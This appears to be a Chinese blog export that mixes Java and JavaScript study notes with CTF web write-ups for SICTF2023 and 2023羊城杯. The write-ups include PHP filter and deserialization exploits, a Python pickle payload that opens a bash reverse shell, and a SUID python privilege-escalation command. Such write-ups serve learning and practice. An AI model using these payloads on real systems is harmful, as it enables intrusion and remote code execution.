私有访问修饰符private\n\n外部无法直接访问到 只能通过本类的public函数间接去访问\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694480716523-da2203d9-db02-4bd0-b5e3-bd27fb410338.png)\n\n可见直接访问是会报错的\n\n### 公有访问修饰符public\n\n很常见就不说了 总之就是门户大开\n\n### 受保护的访问修饰符protected\n\n- 子类与基类在同一包中：被声明为 protected 的变量、方法和构造器能被同一个包中的任何其他类访问\n- 子类与基类不在同一包中：那么在子类中，子类实例可以访问其从基类继承而来的 protected 方法，而不能访问基类实例的protected方法\n\n一般很少用 我在这里就不多说了\n\n### 访问控制和继承\n\n- 父类中声明为 public 的方法在子类中也必须为 public。\n- 父类中声明为 protected 的方法在子类中要么声明为 protected，要么声明为 public，不能声明为 private。\n- 父类中声明为 private 的方法，不能够被子类继承。\n\n## 非访问修饰符\n\n### static修饰符\n\n- 静态变量：static 关键字用来声明独立于对象的静态变量，无论一个类实例化多少对象，它的静态变量只有一份拷贝。 静态变量也被称为类变量。局部变量不能被声明为 static 变量。\n- 静态方法：static 关键字用来声明独立于对象的静态方法。静态方法不能使用类的非静态变量。静态方法从参数列表得到数据，然后计算这些数据。\n\n类变量和方法的访问可以直接使用 classname.variablename 和 classname.methodname 的方式访问\n\n### final修饰符\n\n变量一旦赋值后，不能被重新赋值\n\nfinal 修饰符通常和 static 修饰符一起使用来创建类常量\n\n但是如果不用static那么就要用非静态函数才能调用 也就是不用static修饰的 不然会报错\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694494921294-1f9e0d0c-e368-4b60-902d-d2316bd856b0.png)\n\n可见无法被改变\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694526104172-6998c42b-f2eb-42c3-a65b-0255a76beb00.png)\n\n### abstract修饰符\n\n一个类不能同时被final和abstract修饰\n\n如果类包含抽象函数那么这个类一定要申明为抽象类 不然会报错\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694526671858-76b213e7-7cdf-4112-ba3c-a35514bf8bfa.png)\n\n抽象类可以包含抽象方法和非抽象方法\n\n抽象方法是一种没有任何实现的方法，该方法的具体实现由子类提供\n\n如果有主体会报错\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694526783274-4a224551-70b9-4cda-817c-3eba54d38bd0.png)\n\n抽象方法由其子类实现\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694527074759-a4ec7029-dd3d-4d08-8c2d-97fd24dec9a7.png)\n\n### synchronized\t修饰符\n\nsynchronized 关键字声明的方法同一时间只能被一个线程访问\n\n### transient修饰符\n\n序列化的对象包含被 transient 修饰的实例变量时，java 虚拟机(JVM)跳过该特定的变量。\n\n```java\npublic transient int limit = 55;   // 不会持久化\npublic int b; // 持久化\n```\n\n### volatile修饰符\n\nvolatile 修饰的成员变量在每次被线程访问时，都强制从共享内存中重新读取该成员变量的值。而且，当成员变量发生变化时，会强制线程将变化值回写到共享内存。这样在任何时刻，两个不同的线程总是看到某个成员变量的同一个值。\n\n# JAVA运算符\n\n大致和其他语言差不多 就不过多赘述了\n\n# JAVA循环结构\n\n## while\n\n```java\nwhile( 布尔表达式 ) {\n  //循环内容\n}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694527699055-8b292709-866d-4ddf-b398-e51c0b7a344a.png)\n\n## do...while循环\n\n```java\ndo {\n       //代码语句\n}while(布尔表达式);\n```\n\n此结构会在判断条件是否成立之前执行一次 所以这个结构至少执行一次\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694527858896-5b8a76cd-27bb-4b98-904a-cf1e1b5fe69a.png)\n\n## for\n\n```java\nfor(初始化; 布尔表达式; 更新) {\n    //代码语句\n}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694528192668-49c5d725-b95f-49c0-ac9a-8518d68f133b.png)\n\n## JAVA增强for循环\n\n```java\nfor(声明语句 : 表达式)\n{\n   //代码句子\n}\n```\n\n声明语句：声明新的局部变量，该变量的类型必须和数组元素的类型匹配。其作用域限定在循环语句块，其值与此时数组元素的值相等。\n\n表达式：表达式是要访问的数组名，或者是返回值为数组的方法。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694528414285-3494e0e1-61f2-47b0-a6e5-f1e6e85a9a9c.png)\n\n## continue和break\n\n和其他语言利用一样 不多说\n\n# JAVA条件语句\n\nsame\n\n# JAVA数组\n\n## 声明数组变量\n\n两种方式但是一般推荐第一种方式 \n\n```java\ndataType[] arrayRefVar;   // 首选的方法\n \n或\n \ndataType arrayRefVar[];  // 效果相同，但不是首选方法\n```\n\n## 创建数组\n\n```\narrayRefVar = new dataType[arraySize];\n```\n\n做了两件事情:\n\n1. 首先用`new dataType[arraySize];`创建了一个数组\n2. 然后将其赋值给arrayRefVar\n\n必须先声明然后再创建 如果不声明就创建会报错\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694587804653-2cd473d6-a9ba-4923-b684-339087894567.png)\n\n## 实例\n\n下标依然是从0开始\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694588095152-9207b9b7-b00b-411f-8b0c-4d0d4ef55b97.png)\n\n## for-each循环\n\n其实就是之前我们讲过的循环结构的增强for循环\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694588437392-1f480dd1-9035-4f8c-857d-ae7f7a8d8c3d.png)\n\n## 多维数组\n\n## 初始化\n\n直接为每一维分配空间 这种我们用的最多也最方便\n\n或者是一维一维分配空间\n\n```java\ntype[][] typeName = new type[typeLength1][typeLength2];\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694589029597-c4715464-7d86-45e2-9000-936781c25d8c.png)\n\n# JAVA正则\n\n规则什么的都和其他语言差不多\n\n看个例子\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694590443706-45f8e32f-f306-44fb-9725-86587b0b05c7.png)\n\n首先要引入依赖\n\n然后要分别创建两个类:Pattern和Matcher\n\nPattern是要进行的匹配模式的对象\n\nMatcher是被匹配内容的对象\n\n其次还有一个点就是在java正则模式中转义要用`//`其他语言我们都是只用一个`/`\n","categories":["知识学习"]},{"title":"SICTF2023 WEB WP","url":"/post/508290f8.html","content":"\nSICTF2023\n\n<!--more-->\n\n题目梯度设置的不太合理 两极分化过于严重力\n\n# **Include**\n\n考察伪协议`php://filter/read=convert.base64-encode/resource=`\n\n# Baby_PHP\n\n这个题 很让人难绷 原题的非预期在这道题目上有问题 命令执行没结果。。\n\n考点:\n\n- 套娃也就是无参RCE\n- php非法命名\n- %0a换行绕过\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694165957362-b601bbd8-00b6-4c8d-8e7b-2422490aa360.png)\n\n# RCE\n\n源码:\n\n```plain\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$code = $_POST['code'];\n$code = str_replace(\"(\",\"hacker\",$code);\n$code = str_replace(\".\",\"hacker\",$code);\neval($code);\n?>\n```\n\n过滤了括号和点\n\n这里需要知道就是include可以不用括号就能包含文件\n\npayload:\n\n```plain\npost:code=include$_GET['x'];\nget:x=php://filter/read=convert.base64-encode/resource=/flag\n```\n\n# pain\n\njava捏 不会\n\n# 我全都要\n\n源码:\n\n```plain\n<?php\nhighlight_file(__FILE__);\n\nclass B{\n    public $pop;\n    public $i;\n    public $nogame;\n\n    public function __destruct()\n    {\n        if(preg_match(\"/233333333/\",$this->pop)){\n            echo \"这是一道签到题，不能让新生一直做不出来遭受打击\";\n        }\n    }\n\n    public function game(){\n        echo \"扣1送地狱火\";\n        if ($this->i = \"1\"){\n            echo '<img src=\\'R.jpg\\'>';\n            $this->nogame->love();\n        }\n    }\n\n    public function __clone(){\n        echo \"必须执行\";\n        eval($_POST[\"cmd\"]);\n    }\n}\n\n\nclass A{\n    public $Aec;\n    public $girl;\n    public $boy;\n\n    public function __toString()\n    {\n        echo \"I also want to fall in love\";\n        if($this->girl != $this->boy && md5($this->girl) == md5($this->boy)){\n            $this->Aec->game();\n        }\n    }\n\n\n}\n\n\nclass P{\n    public $MyLover;\n    public function __call($name, $arguments)\n    {\n        echo \"有对象我会在这打CTF???看我克隆一个对象！\";\n        if ($name != \"game\") {\n            echo \"打游戏去，别想着对象了\";\n            $this->MyLover = clone new B;\n        }\n    }\n\n\n}\n\n\nif ($_GET[\"A_B_C\"]){\n    $poc=$_GET[\"A_B_C\"];\n    unserialize($poc);\n```\n\n其实就一个点 __toSting()的调用靠`preg_match(\"/233333333/\",$this->pop)`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694266905359-c54e6f41-856a-42d3-b69d-68300ea81079.png)\n\n可以看到是string类型的 \n\nexp如下：\n\n```plain\n<?php\nclass B{\n    public $pop;\n    public $i;\n    public $nogame;\n}\nclass A{\n    public $Aec;\n    public $girl;\n    public $boy;\n\n}\nclass P{\n    public $MyLover;\n}\n$a=new B();\n$a->pop=new A();\n$a->pop->girl= 'QNKCDZO';\n$a->pop->boy='240610708';\n$a->pop->Aec=new B();\n$a->pop->Aec->i='1';\n$a->pop->Aec->nogame=new P();\necho urlencode(serialize($a));\n?>\n#O%3A1%3A%22B%22%3A3%3A%7Bs%3A3%3A%22pop%22%3BO%3A1%3A%22A%22%3A3%3A%7Bs%3A3%3A%22Aec%22%3BO%3A1%3A%22B%22%3A3%3A%7Bs%3A3%3A%22pop%22%3BN%3Bs%3A1%3A%22i%22%3Bs%3A1%3A%221%22%3Bs%3A6%3A%22nogame%22%3BO%3A1%3A%22P%22%3A1%3A%7Bs%3A7%3A%22MyLover%22%3BN%3B%7D%7Ds%3A4%3A%22girl%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A3%3A%22boy%22%3Bs%3A9%3A%22240610708%22%3B%7Ds%3A1%3A%22i%22%3BN%3Bs%3A6%3A%22nogame%22%3BN%3B%7D\n```\n\n# DoyouknowCC\n\njava 会不了一点\n\n# 你能跟得上我的speed吗\n\n考点:\n\n- 条件竞争\n\n上传和读取同时进行，看脸要等很长时间才成功。。。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694316396871-7e5866eb-393a-4663-90a9-7854bbfa9e84.png)\n","categories":["各赛事WP"]},{"title":"JS简单基础学习","url":"/post/eb0674ad.html","content":"\n纯是为了看懂代码的...没啥用的电子垃圾\n\n<!--more-->\n\n# JS语言特性\n\n- js是一门弱语言，声明变量没有类型统一用var\n- js没有方法重载概念，同名函数会被覆盖\n\n# JS两种引入方式\n\n- 一种是内部直接引入就是通过script标签包裹起来`<script>代码</script>`\n- 另一种是通过文件引入的方式也是通过script标签不过要在其属性加上`scr=路径`\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <title>js学习</title>\n  </head>\n  <body>\n    <!--外部引入-->\n    <script src=\"test1.js\"></script>\n    <!--内部引入-->\n    <script>alert('hello')</script>\n  </body>\n</html>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693902331187-c021f6c2-5762-4bfe-876c-d4f8489a5c2c.png)\n\n# 注释符:\n\n与java一一样都是`//`\n\n# 变量\n\n## 定义变量\n\n`var 变量名 = 值;` 因为是弱类型语言\n\n除了var之外还有let const 三者区别:\n\n- var声明是全局作用域或函数作用域，而let和const是块作用域。\n- var变量可以在其范围内更新和重新声明； let变量可以被更新但不能重新声明； const变量既不能更新也不能重新声明。\n- 它们都被提升到其作用域的顶端。但是，虽然使用变量undefined初始化了var变量，但未初始化let和const变量。\n- 尽管可以在不初始化的情况下声明var和let，但是在声明期间必须初始化const。\n\n来自:[JavaScript 中的 Var、Let 和 Const 有什么区别](https://www.freecodecamp.org/chinese/news/javascript-var-let-and-const/)\n\n使用了 var 关键字，它声明的变量是全局的，包括循环体内与循环体外\n\n使用 let 关键字， 它声明的变量作用域只在循环体内，循环体外的变量不受影响\n\n就是说如果在循环体外和内都定义相同变量\n\n那么var不管在体内还是体外都会改变变量值，而let体外的变量值不受体内的改变而变化\n\n let 关键字声明的全局作用域变量不属于 window 对象\n\n## 未定义undefined\n\nundefined类型只有一个值就是undefined\n\n`var a;`声明但是没有给值那么就是undefined\n\n## 数字number\n\n数字类型的所有的数字均用浮点数值表示(不区分整数值和浮点值,小数点可带可不带)。\n特殊的数字类型NaN:\nNaN 代表非数字的特殊值,用于指示某个值不是数字。\nNaN 非数字与任何数据都不相等，包括自己。\njs内置函数isNaN(),判断数值不是数字。\n`isNaN(123) //false`\n`isNaN(“abc”) //true`\n\n## 字符串string\n\n用双引号或者单引号包裹即可\n\n可以用索引位置来访问其中的每个字符\n\n内置属性length可以用来计算长度 比如`string.length`\n\n字符串中包含单双引号时，就需要转义一下，不然无法解析\n\n## 字符串还可以是对象\n\n new 关键字将字符串定义为一个对象\n\n```plain\nvar x = \"John\";\nvar y = new String(\"John\");\ntypeof x // 返回 String\ntypeof y // 返回 Object\n```\n\n当然String对象最好别用，会拖慢执行速度以及其他副作用\n\n## 布尔 boolean\n\n表示真或者假 只有两个值就是true和false\n\n## 对象 object\n\n对象：是拥有属性和方法的数据\n语法：\nvar 对象名 = `{属性名：属性值，属性名：属性值，…}`\n对象的属性寻址：\n对象属性有两种寻址方式也就是引用方式：\n`people.name;`\n`people[“name”];`\n\n## 常量:\n\n`const AGE=18;` //定义常量\n常量名称常用大写字符\n常量不能赋值改变，否则会报错\n\n## JS字面量(直接量)\n\n**用来为变量赋值时的常数量**\n字面量是指程序中直接显示出来的值。\n100 //数字字面量\n'hello world' //字符串字面量\nfalse //布尔字面量\n`{x:1, y:2}` //对象字面量表达式\n`[1,2,3,4,5]` //数组字面量表达式\n\n## js模板字符串\n\n这里就可以理解为格式化字符串\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694323114599-a0e388c2-4053-4e8c-a00b-0c99c107f1f6.png)\n\n可以将`${}`中变量的值带进去一起解析\n\n## 变量的使用规则\n\n- 变量声明了没有赋值，变量的值就是undefined类型\n- 变量没有声明直接使用，运行时会报错\n\n# Typeof\n\n用来监测数据(变量或者值)的数据类型 \n\n语法：typeof 值\n\n可以理解为php中的var_dump()函数\n\n1. \"undefined\"——如果这个值未定义；\n2. \"boolean\"——如果这个值是布尔值；\n3. \"string\"——如果这个值是字符串；\n4. \"number\"——如果这个值是数值；\n5. \"object\"——如果这个值是对象或null；\n6. \"function\"——如果这个值是函数(函数是对象，不是一种数据类型。然而，函数因为有一些特殊的属性，因此通过typeof操作符来区分函数和其他对象)\n\n# 运算符\n\n## 1、算术运算符是用来执行变量或值的算术运算\n\n++ 自增： x++; //相当于x=x+1\n— 自减： x—;//相当于x=x-1\n自增或自减的运算符的位置不同，意义不同\n\n## 2、赋值运算符是用来给变量赋值\n\n```\nvar num=123;\n```\n\n## 3、字符串连接符\n\n实例1：字符串间的 + 运算符\n字符串间的 + 运算符可以把两个或多个字符串变量连接起来。\n实例2：对字符串和数字进行加法运算返回字符串。\n\n## 4、比较运算符\n\n比较运算符用来测定变量或值是否相等。\n返回值为true或false\n\n`console.log(null==undefined); //true`\n`console.log(null===undefined); //false`\n==判断值是否相等；\n===判断值和数据类型是否都相等；\n\n这一点和php的弱比较和强比较有点像\n\n`console.log(isNaN(undefined));// true NaN`\n`console.log(isNaN(null));// false 0`\nnull是一个表示”空”的对象，转为数值时为0；\nundefined是一个表示”空”的原始值，转为数值时为NaN。\n\n特殊的数字类型NaN，用于指示某个值不是数字。\nNaN 非数字与任何数据都不相等，包括自己。\n\n```plain\nNaN==NaN    //false\nNaN!=NaN    //true\n5 == NaN    //false\n\"5\"==NaN    //false\n```\n\n在js做比较的时候，有这样的三条规则：\n如果比较的两者中有bool，会把 bool 先转换为对应的 number，即 0 和 1\n如果比较的双方中有一方为number一方为string，会把string转换为数字\n把string直接转换为bool的时候，空字符串`''`转换为 false，除此外的一切字符串转换 为 true 总结:先转bool,再转string\n\n# 逻辑运算符\n\n逻辑运算符用来测定变量和值中的逻辑。\n逻辑与&&（找假）\n逻辑或||（找真）\n逻辑非!\n返回值为true或false\n\n# JS的三个内置函数\n\n- 警告框:alert(\"内容\")\n- 确认框:confirm(\"内容\")\n- 在控制台打印日志:console.log(\"日志内容\")\n\n# JS创建对象的两种方式\n\n- 使用new关键字创建对象\n- 使用`{}`创建对象\n\n```html\n//使用new关键字创建对象\nvar obj01=new Object();\nobj01.name=\"jack\";\nobj01.age=100;\nobj01.address=\"china\";\nobj01.showMessage=function(){\n    console.log(obj01);\n}\n//使用{}创建对象\nvar obj02={\n    \"name\":\"jack\",\n    \"age\":20,\n    \"address\":\"china\",\n    \"showMessage\":function(message){\n        console.log(message);\n    }\n};\n```\n\n# 创建数组\n\n- 使用new关键字创建数组：`var arr = new Array();`感觉像是php内置类 有木有？？\n- 使用`[]`创建数组: `var arr = [\"cat\",\"dog\"];`\n\n## 数组常用方法\n\n- 压入数据：`arr01.push(“apple”);`\n- 数组元素反转：`arr01.reverse( );`\n- 把数组元素通过指定的分隔符，拼接成字符串：`var arrStr = arr01.join(“,”);`\n- 把字符串通过指定的分隔符，拆分成数组：`var arr02 = arrStr.split(“,”);`\n- 弹出数组中最后一个元素 ：将数组最后一个元素移除，并返回：`var ele = arr01.pop( );`\n- 遍历数组：`for (var i = 0; i < arr01.length; i++) { console.log(arr01[i]); }`\n\n# this关键字\n\n- 在函数外面：this关键字指向window对象也就是代表当前浏览器窗口\n- 在函数里面：this关键字指向调用函数的对象\n\n会随着执行环境而改变：\n\n- 在方法中，this 表示该方法所属的对象。\n- 如果单独使用，this 表示全局对象。\n- 在函数中，this 表示全局对象。\n- 在函数中，在严格模式下，this 是未定义的(undefined)。\n- 在事件中，this 表示接收事件的元素。\n- 类似 call() 和 apply() 方法可以将 this 引用到任何对象\n\n# 条件语句\n\n和其他语言差不多\n\n语法：\n\n```plain\n第一种\nif (condition)\n{\n    当条件为 true 时执行的代码\n}\n第二种\nif (condition)\n{\n    当条件为 true 时执行的代码\n}\nelse\n{\n    当条件不为 true 时执行的代码\n}\n第三种\nif (condition1)\n{\n    当条件 1 为 true 时执行的代码\n}\nelse if (condition2)\n{\n    当条件 2 为 true 时执行的代码\n}\nelse\n{\n  当条件 1 和 条件 2 都不为 true 时执行的代码\n}\n```\n\n# SWITCH语句\n\n也和其他语言一样 条件等于相应的值时 执行语句\n\n语法：\n\n```plain\nswitch(n)\n{\n    case 1:\n        执行代码块 1\n        break;\n    case 2:\n        执行代码块 2\n        break;\n    default:\n        与 case 1 和 case 2 不同时执行的代码\n}\n```\n\n还有一个小点就是`case(条件)`这里条件中的等号是强等于 不仅比较值也要比较类型\n\n## default\n\n也就是当以上条件都不执行时，就执行该default下的语句\n\n# JS类型转换\n\n## constructor属性\n\nconstructor 属性返回所有 JavaScript 变量的构造函数。\n\n```plain\n\"John\".constructor                 // 返回函数 String()  { [native code] }\n(3.14).constructor                 // 返回函数 Number()  { [native code] }\nfalse.constructor                  // 返回函数 Boolean() { [native code] }\n[1,2,3,4].constructor              // 返回函数 Array()   { [native code] }\n{name:'John', age:34}.constructor  // 返回函数 Object()  { [native code] }\nnew Date().constructor             // 返回函数 Date()    { [native code] }\nfunction () {}.constructor         // 返回函数 Function(){ [native code] }\n```\n\n类型转换比如:\n\n```plain\nvar a=123\nString(a) \na就被转为字符串类型了\n```\n\n# For循环\n\n语法：\n\n```plain\nfor (语句 1; 语句 2; 语句 3)\n{\n    被执行的代码块\n}\n```\n\neg：\n\n```plain\nfor (var i=0; i<5; i++)\n{\n      x=x + \"该数字为 \" + i + \"<br>\";\n}\n```\n\n# while循环\n\n语法：\n\n```plain\nwhile (条件)\n{\n    需要执行的代码\n}\n```\n\n## do-while循环\n\n该循环会在检查条件是否为真之前执行一次代码块，然后如果条件为真的话，就会重复这个循环。\n\n语法：\n\n```plain\ndo\n{\n    需要执行的代码\n}\nwhile (条件);\n```\n\n# break和continue语句\n\n简单说就是break跳出整个循环\n\ncontinue跳出此次循环然后继续下个循环\n\n# js错误-throw、try、catch\n\n```plain\ntry 语句测试代码块的错误\ncatch 语句处理错误\nthrow 语句创建自定义错误\nfinally 语句在 try 和 catch 语句之后，无论是否有触发异常，该语句都会执行\n```\n\n语法：\n\n```plain\ntry {\n    ...    //异常的抛出\n} catch(e) {\n    ...    //异常的捕获与处理\n} finally {\n    ...    //结束处理\n}\n```\n\nthrow放在try下语句，那么能够控制程序流，并生成自定义的错误消息\n\n# JS声明提升\n\n声明提升：函数声明和变量声明总是会被解释器悄悄地被\"提升\"到方法体的最顶部。\n\n函数及变量的声明都将被提升到函数的最顶部\n\n变量可以在使用后声明，也就是变量可以先使用再声明 \n\n只有声明的变量会提升，初始化的不会\n\n这里需要理解什么是声明 什么是初始化\n\n```plain\nvar x; #这是声明\nvar y=10; #这是初始化\n也就是说单纯定义变量是声明 定义并且赋值就是初始化了\n```\n\n# JS严格模式\n\n严格模式通过在脚本或函数的头部添加 `use strict;` 表达式来声明。\n\n为什么使用严格模式:\n\n消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;\n\n- 消除代码运行的一些不安全之处，保证代码运行的安全；\n- 提高编译器效率，增加运行速度；\n- 为未来新版本的Javascript做好铺垫。\n\n\"严格模式\"体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。\n\n另一方面，同样的代码，在\"严格模式\"中，可能会有不一样的运行结果\n\n严格模式限制：\n\n- 不容许使用未声明的变量\n- 不容许删除变量或对象\n- 不容许删除函数\n- 不容许变量重名\n- 不容许使用八进制\n- 不容许使用转义字符\n- 不容许对只读属性赋值\n- 不容许对一个使用getter方法读取的属性进行赋值\n- 不容许删除一个不容许删除的属性\n- 变量名不能使用`'eval，arguments'`字符串\n- 不容许使用这种语句`\"use strict\";with (Math){x = cos(2)};// 报错 `\n- 由于一些安全原因，在作用域 eval() 创建的变量不能被调用\n- 禁止this关键字指向全局对象\n\n\n\n# JSON数据\n\n- JSON数据的本质是一个有规则、可以解析的字符串\n- JSON数据在js中就是一个对象\n\n## JSON格式：\n\n- `{}`:定义JSON对象\n- `[]`：定义JSON数据\n\n```html\nvar json01 = { \"name\":\"三国演义\", \"price\":55.55, \"version\":\"三国演义version01\" };\nvar json02 = { \"name\":\"红楼梦\", \"price\":99.99, \"version\":\"红楼梦version01\" };\nvar json03 = { \"name\":\"西游记\", \"price\":66.65, \"version\":\"西游记version01\" };\nvar jsonList=[\n        json01,\n        json02,\n        json03,\n        {\"name\":\"水浒传\",\"price\":0.00,\"version\":\"null\"}\n    ];\n```\n\n## JSON对象和JSON字符串互转\n\n- JSON.stringify( )：JSON对象转JSON字符串\n- JSON.parse( )：JSON字符串转JSON对象\n\n```html\nvar jsonObj = {\"stuName\":\"tom\",\"stuAge\":20};\nvar jsonStr = JSON.stringify(jsonObj);\nconsole.log(typeof jsonObj); // object\nconsole.log(typeof jsonStr); // string\nvar json=JSON.parse(jsonStr);\nconsole.log(typeof json); // object\n```\n\n# 向未声明的 JavaScript 变量分配值\n\n如果把值赋给尚未声明的变量，该变量将被自动作为 window 的一个属性。\n\n```\ncarname=\"Volvo\";\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694274282232-728d187d-e1bb-4900-9fd3-d9ef8f94c90c.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694274292688-feaec007-0744-4bda-ba1e-33668a514ac3.png)\n\n# JavaScript 事件\n\nHTML 事件是发生在 HTML 元素上的事情。\n\n当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。\n\n## 常见HTML事件列表：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1694322511181-6d2ae76b-5770-4457-8119-23c806db8f59.png)\n\n\n\n\n\n\n\n# DOM文档对象模型\n\nJavaScript 语句是发给浏览器的命令。\n\n这些命令的作用是告诉浏览器要做的事情。\n\n- document对象：代表整个页面的对象，可以直接使用的内置对象\n- DOM的作用是使用JS代码操作HTML页面的标签和内容\n\n\n\n\n\n# DOM树\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693906043115-cddd2244-3b38-4f4a-8043-055aaea864bf.png)\n\n均学习于：\n\nhttps://www.runoob.com/js/js-htmldom.html\n\nhttps://www.kuangstudy.com/bbs/1571499157607657474\n\nhttps://www.kuangstudy.com/bbs/1679494100476669953\n","categories":["知识学习"]},{"title":"2023羊城杯WEB WP与复现学习","url":"/post/3edff1a9.html","content":"\n2023羊城杯WEB WP与复现学习\n\n<!--more-->\n\n# WEB\n\n## D0n't pl4y g4m3!!!\n\nphp 7.4.21源码泄露  之前东北电力大学举办的一个ctf比赛上出过类似题目\n\n```\n/hint.zip\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693623290570-7868b5b7-d2cd-4183-88c1-b7af0b623684.png)\n\n```\nflag在/tmp/catcatf1ag.txt\n```\n\n然后用源码泄露p0p.php\n\n```plain\n<?php\nclass Pro{\n    private $exp;\n    private $rce2;\n\n    public function __get($name)\n    {\n        return $this->$rce2=$this->exp[$rce2];\n    }\n    public  function __toString()\n    {\n        call_user_func('system', \"cat /flag\");\n    }\n}\n\nclass Yang\n{\n    public function __call($name, $ary)\n    {\n        if ($this->key === true || $this->finish1->name) {\n            if ($this->finish->finish) {\n                call_user_func($this->now[$name], $ary[0]);\n            }\n        }\n    }\n    public function ycb()\n    {\n        $this->now = 0;\n        return $this->finish->finish;\n    }\n    public function __wakeup()\n    {\n        $this->key = True;\n    }\n}\nclass Cheng\n{\n    private $finish;\n    public $name;\n    public function __get($value)\n    {\n\n        return $this->$value = $this->name[$value];\n    }\n}\nclass Bei\n{\n    public function __destruct()\n    {\n        if ($this->CTF->ycb()) {\n            $this->fine->YCB1($this->rce, $this->rce1);\n        }\n    }\n    public function __wakeup()\n    {\n        $this->key = false;\n    }\n}\n\nfunction prohib($a){\n    $filter = \"/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i\";\n    return preg_replace($filter,'',$a);\n}\n$a = $_POST[\"CTF\"];\nif(isset($a)){\n    unserialize(prohib($a));\n}\n?>\n```\n\n之后就是一个pop链\n\npaylaod如下：\n\n```plain\n<?php\nhighlight_file(__FILE__);\nclass Pro{\n    private $exp;\n    private $rce2;}\n\nclass Yang{\n    \n}\n\nclass Cheng\n{\n    private $finish;\n    public $name;\n\n}\nclass Bei\n{\n\n}\n$a = new Bei();\n$a->rce = '/tmp/catcatf1ag.txt';\n$a->rce1='/tmp/catcatf1ag.txt';\n$a->CTF = new Yang();\n$a->CTF->finish->finish =1;\n$a->fine = new Yang();\n$a->fine->finish1->name=1;\n$a->fine->finish->finish=1;\n$a->fine->now=[\"YCB1\"=>\"highlight_file\"];\necho urlencode(serialize($a));\n?>\n```\n\n学到了新trick 这里也可以不用文件包含函数 直接双写绕过waf都可以\n\n##  Serpent\n\nflask伪造+python反序列化+提权\n\n没怎么仔细好好学过python反序列化 在这里寄了\n\n获得源码\n\n```plain\n@app.route('/verification')\ndef verification():\n    try:\n        attribute = session.get('Attribute')\n        if not isinstance(attribute, dict):\n            raise Exception\n    except Exception:\n        return 'Hacker!!!'\n    if attribute.get('name') == 'admin':\n        if attribute.get('admin') == 1:\n            return secret\n        else:\n            return \"Don't play tricks on me\"\n    else:\n        return \"You are a perfect stranger to me\"\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80)\n```\n\n一眼丁真 session伪造 直接解码session给了key的 `GWHTNrtE8JiVyR`\n\n之后访问`/src0de`路由再次拿到源码\n\n```plain\n@app.route('/ppppppppppick1e')\ndef ppppppppppick1e():\n    try:\n        username = \"admin\"\n        rsp = make_response(\"Hello, %s \" % username)\n        rsp.headers['hint'] = \"Source in /src0de\"\n        pick1e = request.cookies.get('pick1e')\n        if pick1e is not None:\n            pick1e = base64.b64decode(pick1e)\n        else:\n            return rsp\n        if check(pick1e):\n            pick1e = pickle.loads(pick1e)\n            return \"Go for it!!!\"\n        else:\n            return \"No Way!!!\"\n    except Exception as e:\n        error_message = str(e)\n        return error_message\n\n    return rsp\n\nclass GWHT():\n    def __init__(self):\n        pass\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80)\n```\n\n考察python反序列化 并且有waf 要bypass R\n\n所以用o指令来绕过\n\n```plain\nfrom flask import Flask\nimport base64\npayload=b'''(cos\nsystem\nS'bash -c \"bash -i >& /dev/tcp/ip/port <&1\"'\no.'''\nprint(base64.b64encode(payload))\n```\n\n或者用i指令来绕过 都是出自:https://tttang.com/archive/1885/#toc_i\n\n```plain\nfrom flask import Flask\nimport base64\nopcode=b'''(S'whoami'\nios\nsystem\n.'''\nprint(base64.b64encode(payload))\n```\n\n反弹shell 发现还要提权 读不了flag\n\n**因为这个题目python3.8存在suid 文件具有 SUID 权限，因此当普通用户运行它时，该程序会以文件所有者的权限来运行 所以我们可以提权**\n\n`python3.8 -c \"import os;os.execl('/bin/sh','sh','-p')\"` -c是命令行选项\n\n或者更简单点`python3 -c \"print(open('/flag').read(0)\"`\n\n```\n解释：\n\"import os;os.execl('/bin/sh','sh','-p')\"：这部分是实际的 Python 代码片段，它由两部分组成：\nimport os：这行代码导入了 Python 中的 os 